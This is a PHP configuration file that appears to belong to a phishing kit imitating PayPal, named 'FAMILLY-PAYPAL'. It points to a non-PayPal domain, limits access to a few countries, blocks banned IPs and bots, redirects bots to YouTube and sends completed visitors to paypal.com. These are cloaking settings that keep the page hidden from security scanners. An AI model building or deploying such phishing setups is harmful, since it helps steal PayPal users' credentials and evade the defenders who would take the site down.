<?php

return [
    "name" => "FAMILLY-PAYPAL",
    "url" => "https://connecte-perso.online/",
    "debug" => false,
    "allowed-countries" => "CI, USA,FR", //separate countries code name by comma
    "redirect_url" => [
        "bot" => "https://www.youtube.com/",
        "success" => "https://www.paypal.com",
    ],
    "providers" => [],
    "middlewares" => [
        "banned_ip" => \App\Http\Middlewares\RefuseRequestsContainingBannedIPMiddleware::class,
        "refuse_bot" => \App\Http\Middlewares\RefuseRequestsContainingBots::class,
        "allowed_countries" => \App\Http\Middlewares\AllowedCountriesMiddleware::class,
    ],
];
